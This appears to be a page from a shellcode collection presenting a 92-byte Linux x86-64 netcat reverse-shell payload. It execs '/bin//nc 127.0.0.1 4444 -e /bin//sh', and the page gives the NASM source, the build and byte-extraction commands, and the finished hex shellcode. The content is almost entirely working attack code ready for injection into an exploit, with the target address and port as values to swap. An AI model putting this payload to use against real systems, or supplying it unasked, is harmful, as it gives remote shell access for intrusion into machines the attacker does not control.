---
layout: default
title: Execve netcat Reverse Shell (127.0.0.1:4444)
permalink: /shellcode/asm-26.html
os: Linux
arch: Intel x86-64
length: 92
---

# {{ page.title }}

---
**OS:** {{ page.os }}

**Architecture:** {{ page.arch }}

**Length:** {{ page.length }} bytes

---

## Assembly

```nasm
section .text
global _start

_start:
	xor ebx, ebx				; RBX = 0
	xor ecx, ecx				; RCX = 0
	mul ebx					; RAX, RDX = 0

	; Push "/bin//nc"
	push rax				; Push null terminator
	mov rdi, 0x636e2f2f6e69622f	        ; RDX = "/bin//nc"
	push rdi
	mov rdi, rsp				; RDI -> "/bin//nc"

	; Push "127.0.0.1"
	push rax				; Push null terminator
	mov dl, 0x31				; RDX = "1"
	push rdx
	mov rdx, 0x2e302e302e373231	        ; RDX = "127.0.0."
	push rdx
	mov rdx, rsp				; RDX -> "127.0.0.1"

	; Push "4444"
	push rax				; Push null terminator
	mov ebx, 0x34343434			; RBX = "4444"
	push rbx
	mov rbx, rsp				; RBX -> "4444"

	; Push "-e"
	push rax				; Push null terminator
	mov r11w, 0x652d			; R11 = "-e"
	push r11
	mov r11, rsp				; R11 -> "-e"

	; Push "/bin//sh"
	push rax				; Push null terminator
	mov r12, 0x68732f2f6e69622f	        ; R12 = "/bin//sh"
	push r12
	mov r12, rsp				; R12 -> "/bin//sh"

	; Build argv
	push rax				; Push null terminator
	push r12				; Push "/bin//sh"
	push r11				; Push "-e"
	push rbx				; Push "4444"
	push rdx				; Push "127.0.0.1"
	push rdi				; Push "/bin//nc"
	mov rsi, rsp				; RSI -> {"/bin//nc", "127.0.0.1", "4444", "-e", "/bin//sh"}

	; Execve syscall
	mov al, 0x3b				; RAX = 0x3b
	cdq					; RDX = 0
	syscall
```

## Compilation and Linking

```bash
# Assemble
nasm -f elf64 -o code.o code.asm

# Link
ld -m elf_x86_64 -s -o code code.o

# Extract Shellcode
printf '\\x' && objdump -d code | grep "^ " | cut -f2 | tr -d ' ' | tr -d '\n' | sed 's/.\{2\}/&\\x /g'| head -c-3 | tr -d ' ' && echo ' '
```

## Shellcode

```
\x31\xdb\x31\xc9\xf7\xe3\x50\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x6e\x63\x57\x48\x89\xe7\x50\xb2\x31\x52\x48\xba\x31\x32\x37\x2e\x30\x2e\x30\x2e\x52\x48\x89\xe2\x50\xbb\x34\x34\x34\x34\x53\x48\x89\xe3\x50\x66\x41\xbb\x2d\x65\x41\x53\x49\x89\xe3\x50\x49\xbc\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x41\x54\x49\x89\xe4\x50\x41\x54\x41\x53\x53\x52\x57\x48\x89\xe6\xb0\x3b\x99\x0f\x05
```